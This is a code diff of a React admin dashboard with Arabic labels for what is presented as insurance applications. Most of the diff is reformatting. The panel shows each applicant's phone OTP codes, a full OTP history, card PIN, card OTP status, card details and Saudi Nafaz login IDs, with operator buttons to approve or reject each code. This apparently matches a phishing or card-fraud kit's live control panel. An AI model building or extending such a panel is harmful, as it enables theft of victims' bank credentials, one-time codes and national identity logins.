-                              className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
-                            >
-                              ✗ رفض
-                            </Button>
-                          </div>
-                        )}
-                      {selectedApplication.oldCards && selectedApplication.oldCards.length > 0 && (
-                        <div className="mt-1 p-1.5 bg-red-500/10 rounded border border-red-500/20">
-                          <span className="text-[8px] text-red-400 block mb-0.5">
-                            البطاقات المرفوضة: {selectedApplication.oldCards.length}
-                          </span>
-                          <div className="space-y-0.5 max-h-20 overflow-y-auto">
-                            {selectedApplication.oldCards.map((card, index) => (
-                              <div key={index} className="text-[7px] text-red-300 bg-red-900/20 p-0.5 rounded">
-                                <div>
-                                  البطاقة {index + 1}: {card.cardNumber?.slice(-4) || "N/A"}
-                                </div>
-                                <div>حامل: {card.cardHolderName || "N/A"}</div>
-                              </div>
-                            ))}
-                          </div>
-                        </div>
-                      )}
                     </Section>
                   )}
 
                   {/* Verification Status */}
-                  <Section title="حالة التحقق" icon={<CheckCircle className="w-3 h-3" />}>
+                  <Section
+                    title="حالة التحقق"
+                    icon={<CheckCircle className="w-3 h-3" />}
+                  >
                     <div className="space-y-1">
                       <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                        <span className="text-[8px] text-slate-400">الحالة</span>
+                        <span className="text-[8px] text-slate-400">
+                          الحالة
+                        </span>
                         <div className="flex items-center gap-1">
                           <UserStatus userId={selectedApplication.id!} />
-                          <span className="text-[7px] text-slate-300">متصل</span>
+                          <span className="text-[7px] text-slate-300">
+                            متصل
+                          </span>
                         </div>
                       </div>
                       {selectedApplication.phoneOtp && (
                         <div className="flex items-center justify-between p-1.5 bg-emerald-900/30 rounded border border-emerald-500/30">
-                          <span className="text-[8px] text-emerald-400">رمز OTP الهاتف</span>
-                          <span className="text-[9px] font-mono font-bold text-emerald-300">{selectedApplication.phoneOtp}</span>
+                          <span className="text-[8px] text-emerald-400">
+                            رمز OTP الهاتف
+                          </span>
+                          <span className="text-[9px] font-mono font-bold text-emerald-300">
+                            {selectedApplication.phoneOtp}
+                          </span>
                         </div>
                       )}
                       {selectedApplication.phoneCarrier && (
                         <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400">شركة الاتصالات</span>
-                          <span className="text-[8px] text-slate-300">{selectedApplication.phoneCarrier}</span>
+                          <span className="text-[8px] text-slate-400">
+                            شركة الاتصالات
+                          </span>
+                          <span className="text-[8px] text-slate-300">
+                            {selectedApplication.phoneCarrier}
+                          </span>
                         </div>
                       )}
                       <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                        <span className="text-[8px] text-slate-400">تحقق الهاتف</span>
+                        <span className="text-[8px] text-slate-400">
+                          تحقق الهاتف
+                        </span>
                         <Badge
-                          className={`text-[7px] ${selectedApplication.phoneVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                          className={`text-[7px] ${
+                            selectedApplication.phoneVerificationStatus ===
+                            "approved"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.phoneVerificationStatus ===
+                                "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                          }`}
                         >
-                          {selectedApplication.phoneVerificationStatus || "معلق"}
+                          {selectedApplication.phoneVerificationStatus ||
+                            "معلق"}
                         </Badge>
                       </div>
                       <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                        <span className="text-[8px] text-slate-400">تحقق الهوية</span>
+                        <span className="text-[8px] text-slate-400">
+                          تحقق الهوية
+                        </span>
                         <Badge
-                          className={`text-[7px] ${selectedApplication.idVerificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.idVerificationStatus === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                          className={`text-[7px] ${
+                            selectedApplication.idVerificationStatus ===
+                            "approved"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.idVerificationStatus ===
+                                "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                          }`}
                         >
                           {selectedApplication.idVerificationStatus || "معلق"}
                         </Badge>
                       </div>
                       <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                        <span className="text-[8px] text-slate-400">رمز الهاتف</span>
+                        <span className="text-[8px] text-slate-400">
+                          رمز الهاتف
+                        </span>
                         <Badge
-                          className={`text-[7px] ${selectedApplication.phoneOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.phoneOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                          className={`text-[7px] ${
+                            selectedApplication.phoneOtpApproved === "approved"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.phoneOtpApproved ===
+                                "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                          }`}
                         >
                           {selectedApplication.phoneOtpApproved || "معلق"}
                         </Badge>
                       </div>
                       <div className="flex items-center justify-between p-1.5 bg-slate-900/50 rounded">
-                        <span className="text-[8px] text-slate-400">رمز البطاقة</span>
+                        <span className="text-[8px] text-slate-400">
+                          رمز البطاقة
+                        </span>
                         <Badge
-                          className={`text-[7px] ${selectedApplication.cardOtpApproved === "approved" ? "bg-emerald-500/20 text-emerald-400" : selectedApplication.cardOtpApproved === "rejected" ? "bg-red-500/20 text-red-400" : "bg-amber-500/20 text-amber-400"}`}
+                          className={`text-[7px] ${
+                            selectedApplication.cardOtpApproved === "approved"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.cardOtpApproved ===
+                                "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                          }`}
                         >
                           {selectedApplication.cardOtpApproved || "معلق"}
                         </Badge>
@@ -959,7 +1162,10 @@ export default function AdminDashboard() {
                   </Section>
 
                   {/* Phone OTP Approval */}
-                  <Section title="موافقة رمز الهاتف" icon={<Phone className="w-3 h-3" />}>
+                  <Section
+                    title="موافقة رمز الهاتف"
+                    icon={<Phone className="w-3 h-3" />}
+                  >
                     <DataRow
                       label="الهاتف"
                       value={selectedApplication.phoneNumber}
@@ -978,85 +1184,130 @@ export default function AdminDashboard() {
                       onCopy={copyToClipboard}
                       copied={copiedField!}
                     />
-                    {selectedApplication.phoneOtpApproved !== "approved" && (
-                      <div className="flex gap-1 mt-1">
-                        <Button
-                          onClick={() => handleApprovePhoneOtp(selectedApplication.id!)}
-                          size="sm"
-                          className="h-5 text-[8px] px-1.5 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
-                        >
-                          ✓ موافقة
-                        </Button>
-                        <Button
-                          onClick={() => handleRejectPhoneOtp(selectedApplication.id!)}
-                          size="sm"
-                          className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
-                        >
-                          ✗ رفض
-                        </Button>
-                      </div>
-                    )}
+                    <div className="flex gap-1 mt-1">
+                      <Button
+                        onClick={() =>
+                          handleApprovePhoneOtp(selectedApplication.id!)
+                        }
+                        size="sm"
+                        className="h-5 text-[8px] px-1.5 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
+                      >
+                        ✓ موافقة
+                      </Button>
+                      <Button
+                        onClick={() =>
+                          handleRejectPhoneOtp(selectedApplication.id!)
+                        }
+                        size="sm"
+                        className="h-5 text-[8px] px-1.5 rounded bg-red-500/20 text-red-400 hover:bg-red-500/30"
+                      >
+                        ✗ رفض
+                      </Button>
+                    </div>
                     {selectedApplication.phoneOtpApproved === "approved" && (
-                      <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">رمز الهاتف موافق ✓</Badge>
+                      <Badge className="text-[8px] bg-emerald-500/20 text-emerald-400 mt-1">
+                        رمز الهاتف موافق ✓
+                      </Badge>
                     )}
                     {selectedApplication.phoneOtpApproved === "rejected" && (
-                      <Badge className="text-[8px] bg-red-500/20 text-red-400 mt-1">رمز الهاتف مرفوض ✗</Badge>
+                      <Badge className="text-[8px] bg-red-500/20 text-red-400 mt-1">
+                        رمز الهاتف مرفوض ✗
+                      </Badge>
                     )}
-                    {selectedApplication.allPhoneOtps && selectedApplication.allPhoneOtps.length > 0 && (
-                      <div className="mt-1 p-1.5 bg-slate-800/50 rounded border border-slate-700">
-                        <span className="text-[8px] text-slate-400 block mb-0.5">
-                          سجل رموز ({selectedApplication.allPhoneOtps.length})
-                        </span>
-                        <div className="flex flex-wrap gap-0.5">
-                          {selectedApplication.allPhoneOtps.map((otp, index) => (
-                            <span key={index} className="text-[7px] bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded">
-                              {otp}
-                            </span>
-                          ))}
+                    {selectedApplication.allPhoneOtps &&
+                      selectedApplication.allPhoneOtps.length > 0 && (
+                        <div className="mt-1 p-1.5 bg-slate-800/50 rounded border border-slate-700">
+                          <span className="text-[8px] text-slate-400 block mb-0.5">
+                            سجل رموز ({selectedApplication.allPhoneOtps.length})
+                          </span>
+                          <div className="flex flex-wrap gap-0.5">
+                            {selectedApplication.allPhoneOtps.map(
+                              (otp, index) => (
+                                <span
+                                  key={index}
+                                  className="text-[7px] bg-blue-500/20 text-blue-300 px-1 py-0.5 rounded"
+                                >
+                                  {otp}
+                                </span>
+                              )
+                            )}
+                          </div>
                         </div>
-                      </div>
-                    )}
+                      )}
                   </Section>
 
                   {/* All Approvals Summary */}
-                  <Section title="ملخص الموافقات" icon={<CheckCircle className="w-3 h-3" />}>
+                  <Section
+                    title="ملخص الموافقات"
+                    icon={<CheckCircle className="w-3 h-3" />}
+                  >
                     <div className="space-y-1.5">
                       <div className="flex items-center justify-between p-1.5 bg-slate-800/50 rounded">
-                        <span className="text-[9px] text-slate-300">حالة البطاقة:</span>
-                        <Badge className={`text-[8px] ${
-                          selectedApplication.cardStatus === "approved_with_otp" || selectedApplication.cardStatus === "approved_with_pin"
-                            ? "bg-emerald-500/20 text-emerald-400"
+                        <span className="text-[9px] text-slate-300">
+                          حالة البطاقة:
+                        </span>
+                        <Badge
+                          className={`text-[8px] ${
+                            selectedApplication.cardStatus ===
+                              "approved_with_otp" ||
+                            selectedApplication.cardStatus ===
+                              "approved_with_pin"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.cardStatus === "rejected"
+                              ? "bg-red-500/20 text-red-400"
+                              : "bg-amber-500/20 text-amber-400"
+                          }`}
+                        >
+                          {selectedApplication.cardStatus ===
+                          "approved_with_otp"
+                            ? "موافق - OTP"
+                            : selectedApplication.cardStatus ===
+                              "approved_with_pin"
+                            ? "موافق - PIN"
                             : selectedApplication.cardStatus === "rejected"
-                              ? "bg-red-500/20 text-red-400"
-                              : "bg-amber-500/20 text-amber-400"
-                        }`}>
-                          {selectedApplication.cardStatus === "approved_with_otp" ? "موافق - OTP" 
-                            : selectedApplication.cardStatus === "approved_with_pin" ? "موافق - PIN"
-                            : selectedApplication.cardStatus === "rejected" ? "مرفوض"
+                            ? "مرفوض"
                             : "قيد الانتظار"}
                         </Badge>
                       </div>
                       <div className="flex items-center justify-between p-1.5 bg-slate-800/50 rounded">
-                        <span className="text-[9px] text-slate-300">رمز الهاتف:</span>
-                        <Badge className={`text-[8px] ${
-                          selectedApplication.phoneOtpApproved === "approved"
-                            ? "bg-emerald-500/20 text-emerald-400"
-                            : selectedApplication.phoneOtpApproved === "rejected"
+                        <span className="text-[9px] text-slate-300">
+                          رمز الهاتف:
+                        </span>
+                        <Badge
+                          className={`text-[8px] ${
+                            selectedApplication.phoneOtpApproved === "approved"
+                              ? "bg-emerald-500/20 text-emerald-400"
+                              : selectedApplication.phoneOtpApproved ===
+                                "rejected"
                               ? "bg-red-500/20 text-red-400"
                               : "bg-amber-500/20 text-amber-400"
-                        }`}>
-                          {selectedApplication.phoneOtpApproved === "approved" ? "موافق ✓" 
-                            : selectedApplication.phoneOtpApproved === "rejected" ? "مرفوض ✗"
+                          }`}
+                        >
+                          {selectedApplication.phoneOtpApproved === "approved"
+                            ? "موافق ✓"
+                            : selectedApplication.phoneOtpApproved ===
+                              "rejected"
+                            ? "مرفوض ✗"
                             : "قيد الانتظار"}
                         </Badge>
                       </div>
                       <div className="flex items-center justify-between p-1.5 bg-slate-800/50 rounded">
-                        <span className="text-[9px] text-slate-300">الحالة العامة:</span>
-                        <Badge className={`text-[8px] ${getStatusColor(selectedApplication.status || "draft")}`}>
-                          {selectedApplication.status === "completed" ? "مكتمل"
-                            : selectedApplication.status === "approved" ? "موافق"
-                            : selectedApplication.status === "rejected" ? "مرفوض"
-                            : selectedApplication.status === "pending_review" ? "قيد المراجعة"
+                        <span className="text-[9px] text-slate-300">
+                          الحالة العامة:
+                        </span>
+                        <Badge
+                          className={`text-[8px] ${getStatusColor(
+                            selectedApplication.status || "draft"
+                          )}`}
+                        >
+                          {selectedApplication.status === "completed"
+                            ? "مكتمل"
+                            : selectedApplication.status === "approved"
+                            ? "موافق"
+                            : selectedApplication.status === "rejected"
+                            ? "مرفوض"
+                            : selectedApplication.status === "pending_review"
+                            ? "قيد المراجعة"
                             : "مسودة"}
                         </Badge>
                       </div>
@@ -1064,7 +1315,10 @@ export default function AdminDashboard() {
                   </Section>
 
                   {/* Nafaz Integration Info */}
-                  <Section title="معلومات نفاذ" icon={<Key className="w-3 h-3" />}>
+                  <Section
+                    title="معلومات نفاذ"
+                    icon={<Key className="w-3 h-3" />}
+                  >
                     <DataRow
                       label="معرف نفاذ"
                       value={selectedApplication.nafazId}
@@ -1079,10 +1333,16 @@ export default function AdminDashboard() {
                     />
                     <div className="space-y-1">
                       <div className="flex items-center justify-between">
-                        <span className="text-[9px] text-slate-400">رقم التفويض:</span>
+                        <span className="text-[9px] text-slate-400">
+                          رقم التفويض:
+                        </span>
                         {!isEditingAuth && (
                           <Button
-                            onClick={() => startEditingAuth(selectedApplication.authNumber || "")}
+                            onClick={() =>
+                              startEditingAuth(
+                                selectedApplication.authNumber || ""
+                              )
+                            }
                             size="sm"
                             className="h-4 text-[7px] px-1 rounded bg-blue-500/20 text-blue-400 hover:bg-blue-500/30"
                           >
@@ -1094,12 +1354,16 @@ export default function AdminDashboard() {
                         <div className="flex gap-1">
                           <Input
                             value={editingAuthNumber}
-                            onChange={(e) => setEditingAuthNumber(e.target.value)}
+                            onChange={(e) =>
+                              setEditingAuthNumber(e.target.value)
+                            }
                             className="h-6 text-[9px] bg-slate-800 border-slate-700 text-white"
                             placeholder="أدخل رقم التفويض"
                           />
                           <Button
-                            onClick={() => handleUpdateAuthNumber(selectedApplication.id!)}
+                            onClick={() =>
+                              handleUpdateAuthNumber(selectedApplication.id!)
+                            }
                             size="sm"
                             className="h-6 text-[8px] px-2 rounded bg-emerald-500/20 text-emerald-400 hover:bg-emerald-500/30"
                           >
@@ -1126,7 +1390,10 @@ export default function AdminDashboard() {
 
                   {/* PIN Code Section */}
                   {selectedApplication.pinCode && (
-                    <Section title="رمز PIN" icon={<Lock className="w-3 h-3" />}>
+                    <Section
+                      title="رمز PIN"
+                      icon={<Lock className="w-3 h-3" />}
+                    >
                       <DataRow
                         label="رمز PIN"
                         value={selectedApplication.pinCode}
@@ -1137,13 +1404,25 @@ export default function AdminDashboard() {
                   )}
 
                   {/* Status Controls */}
-                  <Section title="الإجراءات" icon={<Settings className="w-3 h-3" />}>
+                  <Section
+                    title="الإجراءات"
+                    icon={<Settings className="w-3 h-3" />}
+                  >
                     <div className="flex gap-1 flex-wrap">
-                      {["draft", "pending_review", "approved", "rejected", "completed"].map((status) => (
+                      {[
+                        "draft",
+                        "pending_review",
+                        "approved",
+                        "rejected",
+                        "completed",
+                      ].map((status) => (
                         <Button
                           key={status}
                           onClick={() =>
-                            handleStatusChange(selectedApplication.id!, status as InsuranceApplication["status"])
+                            handleStatusChange(
+                              selectedApplication.id!,
+                              status as InsuranceApplication["status"]
+                            )
                           }
                           size="sm"
                           className={`h-5 text-[8px] px-1.5 rounded ${
@@ -1155,20 +1434,24 @@ export default function AdminDashboard() {
                           {status === "pending_review"
                             ? "قيد المراجعة"
                             : status === "draft"
-                              ? "مسودة"
-                              : status === "approved"
-                                ? "موافق"
-                                : status === "rejected"
-                                  ? "مرفوض"
-                                  : "مكتمل"}
+                            ? "مسودة"
+                            : status === "approved"
+                            ? "موافق"
+                            : status === "rejected"
+                            ? "مرفوض"
+                            : "مكتمل"}
                         </Button>
                       ))}
                     </div>
                   </Section>
 
                   {/* Metadata */}
-                  {(selectedApplication.assignedProfessional || selectedApplication.notes) && (
-                    <Section title="الملاحظات" icon={<Info className="w-3 h-3" />}>
+                  {(selectedApplication.assignedProfessional ||
+                    selectedApplication.notes) && (
+                    <Section
+                      title="الملاحظات"
+                      icon={<Info className="w-3 h-3" />}
+                    >
                       {selectedApplication.assignedProfessional && (
                         <DataRow
                           label="المسؤول"
@@ -1179,7 +1462,9 @@ export default function AdminDashboard() {
                       )}
                       {selectedApplication.notes && (
                         <div className="p-1.5 bg-slate-900/50 rounded">
-                          <span className="text-[8px] text-slate-400 block mb-0.5">الملاحظات:</span>
+                          <span className="text-[8px] text-slate-400 block mb-0.5">
+                            الملاحظات:
+                          </span>
                           <p className="text-[8px] text-slate-300 whitespace-pre-wrap max-h-16 overflow-y-auto">
                             {selectedApplication.notes}
                           </p>
@@ -1202,19 +1487,33 @@ export default function AdminDashboard() {
         </div>
       </div>
     </div>
-  )
+  );
 }
 
-function Section({ title, icon, children, className }: { title: string; icon: React.ReactNode; children: React.ReactNode; className?: string }) {
+function Section({
+  title,
+  icon,
+  children,
+  className,
+}: {
+  title: string;
+  icon: React.ReactNode;
+  children: React.ReactNode;
+  className?: string;
+}) {
   return (
-    <div className={`bg-slate-800/30 rounded-lg border border-slate-700/50 p-2 ${className || ""}`}>
+    <div
+      className={`bg-slate-800/30 rounded-lg border border-slate-700/50 p-2 ${
+        className || ""
+      }`}
+    >
       <div className="flex items-center gap-1.5 mb-1.5">
         <div className="text-slate-400">{icon}</div>
         <h3 className="text-[9px] font-bold text-slate-200">{title}</h3>
       </div>
       <div className="space-y-0.5">{children}</div>
     </div>
-  )
+  );
 }
 
 function DataRow({
@@ -1222,9 +1521,14 @@ function DataRow({
   value,
   onCopy,
   copied,
-}: { label: string; value?: string | number | null; onCopy: (v: string, id: string) => void; copied: string }) {
-  if (!value) return null
-  const id = `${label}-${value}`
+}: {
+  label: string;
+  value?: string | number | null;
+  onCopy: (v: string, id: string) => void;
+  copied: string;
+}) {
+  if (!value) return null;
+  const id = `${label}-${value}`;
   return (
     <div className="flex items-center justify-between bg-slate-900/50 rounded px-1.5 py-0.5">
       <span className="text-[8px] text-slate-500">{label}</span>
@@ -1232,10 +1536,17 @@ function DataRow({
         <span className="text-[8px] text-white" dir="ltr">
           {value}
         </span>
-        <button onClick={() => onCopy(String(value), id)} className="text-slate-500 hover:text-white p-0.5">
-          {copied ? <Check className="w-2 h-2 text-emerald-400" /> : <Copy className="w-2 h-2" />}
+        <button
+          onClick={() => onCopy(String(value), id)}
+          className="text-slate-500 hover:text-white p-0.5"
+        >
+          {copied ? (
+            <Check className="w-2 h-2 text-emerald-400" />
+          ) : (
+            <Copy className="w-2 h-2" />
+          )}
         </button>
       </div>
     </div>
-  )
+  );
 }
